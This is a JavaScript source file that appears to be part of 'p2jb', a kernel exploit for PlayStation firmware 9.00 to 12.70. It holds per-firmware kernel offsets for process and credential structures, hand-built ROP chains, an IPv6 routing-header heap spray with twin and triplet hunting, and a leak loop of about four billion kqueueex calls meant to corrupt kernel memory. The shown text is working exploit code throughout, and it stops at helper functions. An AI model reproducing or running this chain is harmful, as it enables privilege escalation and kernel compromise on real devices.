        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const UMTX_OP_WAIT = 2n;
        const UMTX_OP_WAKE = 3n;

        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;
        const UIO_SYSSPACE = 1n;

        const TRIPLEFREE_ATTEMPTS = 96;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        const NUM_IPV6_SOCKETS = 64;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const LEAK_CORES = [0, 1, 2, 3];

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            setrlimit: 0xC3n,
        };

        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        const FW_OFFSETS_P2JB = {
            "9.00": { DATA_BASE_ALLPROC: 0x02755D50n },
            "9.05": { DATA_BASE_ALLPROC: 0x02755D50n },
            "10.00": { DATA_BASE_ALLPROC: 0x02765D70n },
            "11.00": { DATA_BASE_ALLPROC: 0x02875D70n },
            "12.00": { DATA_BASE_ALLPROC: 0x02885E00n },
        };

        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.20": "9.05", "9.40": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.60": "10.00",
            "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
            "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
            "12.60": "12.00", "12.70": "12.00",
        };

        function ensure_kernel_offset() {
            try {
                if (typeof kernel_offset === "object" && kernel_offset !== null
                    && kernel_offset.DATA_BASE_ALLPROC !== undefined) return;
                kernel_offset = get_kernel_offset();
                return;
            } catch (_) { }

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                const major = FW_VERSION.split(".")[0];
                fw = FW_OFFSETS_P2JB[major + ".00"];
            }
            if (!fw) throw new Error("p2jb: FW " + FW_VERSION + " not supported");

            kernel_offset = {
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n,

                FD_CDIR: 0x08n, FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n,

                PIPE_SIGIO: 0xD8n,
            };
        }

        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const setjmp_addr = libc_base + 0x58F80n;
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32(jmpbuf + 0x44n));
        }

        function js_sleep(ms) {
            return new Promise((resolve) => { setTimeout(resolve, ms); });
        }

        function spawn_leak_worker(chain_addr) {
            const Thrd_create_addr = libc_base + 0x4BF0n;
            const longjmp_addr = libc_base + 0x58FD0n;
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64(jb + BigInt(i), scratch);
            write64(jb + 0x00n, ROP.ret);
            write64(jb + 0x10n, chain_addr);
            write32(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32(jb + 0x44n, BigInt(saved_mxcsr));
            const thr_handle = malloc(8); write64(thr_handle, 0n);
            const ret = call(Thrd_create_addr, thr_handle, longjmp_addr, jb);
            if (ret !== 0n) fail("leak worker Thrd_create failed: " + toHex(ret));
            return read64(thr_handle);
        }

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
            const entry = buf + 0x4000n;

            const mask = malloc(0x10);
            write64(mask + 0x0n, 1n << BigInt(core));
            write64(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummybuf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, ROP.pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, ROP.pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }
            emit(ROP.pop_rax); emit(EXIT_MARK);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function ulog(msg) {
            return log("[p2jb] " + msg);
        }

        function fail(msg) { throw new Error("p2jb: " + msg); }

        function nanosleep_ms(ms) {
            const ts = malloc(16);
            write64(ts, BigInt(Math.floor(ms / 1000)));
            write64(ts + 8n, BigInt((ms % 1000) * 1000000));
            syscall(SYSCALL.nanosleep, ts, 0n);
        }

        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8(buf, 0n);
            write8(buf + 1n, BigInt(len));
            write8(buf + 2n, 0n);
            write8(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }

        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }

        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n) {
            const HDR_SIZE = 8;
            const ARRAY_SIZE = 3 * n * 8;
            const raw = malloc(64 + HDR_SIZE + ARRAY_SIZE + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const cmd_addr = raw + align;
            const finished_base = cmd_addr + 8n;
            const awake_base = finished_base + BigInt(n * 8);

            write64(cmd_addr, 0n);
            for (let i = 0; i < n; i++) {
                write64(finished_base + BigInt(i * 8), 0n);
                write64(awake_base + BigInt(i * 8), 0n);
            }

            const ws = {
                n,
                cmd: cmd_addr,
                gen: 0n,
                finished: finished_base,
                awake: awake_base,

                wait_val_slots: new Array(n).fill(0n),
                pivot_slots: new Array(n).fill(0n),
                exit_addrs: new Array(n).fill(0n),
                signal() {
                    const next = this.gen + 1n;
                    this.gen = next;

                    for (let i = 0; i < n; i++) {
                        write64(this.finished + BigInt(i * 8), 0n);
                        write64(this.awake + BigInt(i * 8), 0n);
                    }

                    for (let i = 0; i < n; i++) {
                        write64(this.wait_val_slots[i], next);
                    }

                    write64(this.cmd, next);

                    const deadline = Date.now() + 5000;
                    while (true) {
                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
                            0x7FFFFFFFn, 0n, 0n);
                        let all_awake = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64(this.awake + BigInt(i * 8)) === 0n) {
                                all_awake = false; stuck = i; break;
                            }
                        }
                        if (all_awake) break;
                        if (Date.now() > deadline)
                            fail("worker_sync.signal: WAKE timeout - worker " +
                                stuck + "/" + n + " never reached WAIT exit");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64(this.finished + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline)
                            fail("worker_sync.wait: timeout - worker " + stuck +
                                "/" + n + " stalled (no response in 15s)");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                terminate() {

                    for (let i = 0; i < n; i++) {
                        write64(this.pivot_slots[i], this.exit_addrs[i]);
                    }
                    this.signal();
                    this.wait();
                },
            };
            return ws;
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            const STACK_SIZE = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
            const entry = buf + 0x4000n;

            const cmd_addr = ws.cmd;
            const awake_addr = ws.awake + BigInt(wid * 8);
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const waitBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
            emit(ROP.pop_rdi); emit(cmd_addr);
            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
            emit(ROP.pop_rdx); emit(0n);
            emit(ROP.pop_rcx); emit(0n);
            emit(ROP.pop_r8); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const wait_val_slot = at(waitBase + 7);

            const awakeBase = idx;
            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(awake_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.ret);

            const workBase = idx;
            emit(ROP.pop_rax); emit(sysnum);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(count_arg);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(waitBase + 0, ROP.pop_rax);
            repairSlot(waitBase + 1, SYSCALL.umtx_op);
            repairSlot(waitBase + 2, ROP.pop_rdi);
            repairSlot(waitBase + 3, cmd_addr);
            repairSlot(waitBase + 4, ROP.pop_rsi);
            repairSlot(waitBase + 5, UMTX_OP_WAIT);
            repairSlot(waitBase + 6, ROP.pop_rdx);

            repairSlot(waitBase + 8, ROP.pop_rcx);
            repairSlot(waitBase + 9, 0n);
            repairSlot(waitBase + 10, ROP.pop_r8);
            repairSlot(waitBase + 11, 0n);
            repairSlot(waitBase + 12, syscall_wrapper);
            repairSlot(awakeBase + 0, ROP.pop_rax);
            repairSlot(awakeBase + 1, 1n);
            repairSlot(awakeBase + 2, ROP.pop_rdi);
            repairSlot(awakeBase + 3, awake_addr);
            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
            repairSlot(workBase + 0, ROP.pop_rax);
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, ROP.pop_rdi);
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, ROP.pop_rsi);
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, ROP.pop_rdx);
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const pivotSlotIdx = idx;
            emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT_START = idx;
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return {
                entry,
                wait_val_slot,
                pivotAddr: at(pivotSlotIdx),
                exitAddr: at(EXIT_START),
            };
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: kernel_offset,
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8(S.cpu_mask + BigInt(i), 0n);
            write16(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16(S.rt_params, PRI_REALTIME);
            write16(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
        }

        function get_current_core() {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
            let num = Number(read32(mask));
            let position = 0;
            while (num > 0) { num = num >>> 1; position += 1; }
            return position - 1;
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
            write16(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32(sv1));
            S.iov_sock_b = Number(read32(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32(sv2));
            S.uio_sock_b = Number(read32(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64(S.recvmsg_iovecs, 1n);
            write64(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64(S.recvmsg_hdr + BigInt(i), 0n);
            write64(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_read + BigInt(i), 0n);
            }
            write64(S.uio_iov_read, S.uio_read_buf);
            write64(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_write + BigInt(i), 0n);
            }
            write64(S.uio_iov_write, S.uio_write_buf);
            write64(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        function setup_workers(S) {
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);

            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
                S.iov_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }

        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }

        function rthdr_get_tag(S, idx) {
            write32(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32(S.tag_buf + 4n));
        }

        async function find_twins(S, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    rthdr_set(S, i);
                }
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = rthdr_get_tag(S, i);
                    if (v === null) continue;
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count) {
                        return [i, j];
                    }
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function find_triplet(S, master_idx, exclude_idx, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                        rthdr_set(S, i);
                    }
                }
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        async function prepare_fds(S) {

            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);
            const nofile_hard = read64(rl + 8n);
            write64(rl, nofile_hard);
            write64(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, 0n);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                break;
            }
            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, 0n)
                : syscall(SYSCALL.socket, 28n, 2n, 0n);

            const probe_fds = [];
            for (let i = 0; i < 8192; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                probe_fds.push(pfd);
            }
            const fd_budget = probe_fds.length;
            for (let i = 0; i < probe_fds.length; i++)
                syscall(SYSCALL.close, BigInt(probe_fds[i]));

            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 2048) free_fds_num = 2048;

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);

            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);

            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 4096;
            const U = BigInt(LEAK_UNROLL);

            const NW = LEAK_CORES.length;
            const FEED_CHUNK = 4096;

            const chunkbuf = malloc(FEED_CHUNK);

            const base_share = TOTAL_SYSCALLS / BigInt(NW);
            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
            const lws = [];
            for (let w = 0; w < NW; w++) {
                const target_w = base_share + (w === 0 ? extra0 : 0n);
                const bplus1_w = target_w / U;
                const normal_w = bplus1_w - 1n;
                const remainder_w = target_w - bplus1_w * U;
                const [pr, pw] = create_pipe();
                const rfd = Number(pr), wfd = Number(pw);

                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                const finished = malloc(8); write64(finished, 0n);
                const dummybuf = malloc(8);
                const chain = build_leak_worker_chain(
                    LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                    Number(remainder_w));
                spawn_leak_worker(chain.entry);
                lws.push({
                    chain, rfd, wfd, finished,
                    normal: normal_w, queued: 0n
                });
            }

            let all_fed = false;
            while (!all_fed) {
                all_fed = true;
                for (const lw of lws) {
                    if (lw.queued < lw.normal) {
                        all_fed = false;
                        let want = lw.normal - lw.queued;
                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
                        const n = syscall(SYSCALL.write, BigInt(lw.wfd),
                            chunkbuf, want);
                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
                    }
                }
                await js_sleep(500);
            }

            for (const lw of lws) {
                while (true) {
                    write64(lw.finished, 0n);
                    await js_sleep(1500);
                    if (read64(lw.finished) === 0n) break;
                }
            }

            for (const lw of lws) {
                write64(lw.chain.pivotAddr, lw.chain.exitAddr);
                write64(lw.finished, 0n);
                syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
            }
            for (const lw of lws) {
                const dl = Date.now() + 15000;
                while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl)
                    await js_sleep(50);
                syscall(SYSCALL.close, BigInt(lw.rfd));
                syscall(SYSCALL.close, BigInt(lw.wfd));
            }

            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                S.free_fds.push(Number(fd));
            }
            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);
        }

        function free_one_fd(S) {

            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx]));
            S.free_fd_idx++;
        }

        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
        }

